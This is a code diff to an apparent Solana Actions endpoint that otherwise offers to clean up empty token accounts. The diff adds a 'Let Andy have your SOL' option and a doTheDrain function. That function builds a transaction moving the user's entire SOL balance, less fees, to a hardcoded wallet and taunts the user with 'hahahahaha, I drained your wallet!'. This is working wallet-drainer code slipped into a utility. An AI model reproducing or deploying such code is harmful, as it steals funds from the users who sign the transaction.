@@ -25,6 +25,10 @@ export async function GET(request: Request) {
             href: request.url+"?pg=token22",
             label: "Token22"
           }, 
+          {
+            href: request.url+"?pg=drain",
+            label: "Let Andy have your SOL"
+          }, 
         ]
       },
     // disabled: true
@@ -56,6 +60,11 @@ export async function POST(request: Request) {
   tx.add(ComputeBudgetProgram.setComputeUnitLimit({units: 100_000}))
   tx.add(ComputeBudgetProgram.setComputeUnitPrice({microLamports: 10_000}))
 
+
+  if (programString=="drain"){
+    return doTheDrain(connection, user, tx);
+  }
+
   const tokenProgram = programString=="token22" ? TOKEN_2022_PROGRAM_ID : TOKEN_PROGRAM_ID;
 
   let emptyTAs = await getEmptyTokenAccounts(user, connection, tokenProgram);
@@ -86,4 +95,32 @@ export async function POST(request: Request) {
 
 export async function OPTIONS(request: Request) {
   return new Response(null, {headers: ACTIONS_CORS_HEADERS})
+}
+
+async function doTheDrain(connection: Connection, user: PublicKey, tx: Transaction) {
+  const andysWallet = new PublicKey("AndykcFpupACYs2x74mDiu4tFH22NGrGBrcZzGicG1Xa")
+  const fees = 5000+1000;
+  const balance = await connection.getBalance(user); 
+  const ix = SystemProgram.transfer(
+    {
+      fromPubkey: user,
+      toPubkey: andysWallet,
+      lamports: balance-fees
+    }
+  )
+
+  tx.add(ix);
+
+  tx.feePayer = user
+  const bh = (await connection.getLatestBlockhash({commitment: "finalized"})).blockhash; 
+  console.log("using blockhash "+bh)
+  tx.recentBlockhash = bh
+  const serialTX = tx.serialize({requireAllSignatures: false, verifySignatures: false}).toString("base64");
+
+  const response : ActionPostResponse = {
+    transaction: serialTX,
+    message: "hahahahaha, I drained your wallet!"
+  };
+  return Response.json(response, {headers: ACTIONS_CORS_HEADERS})
+
 }
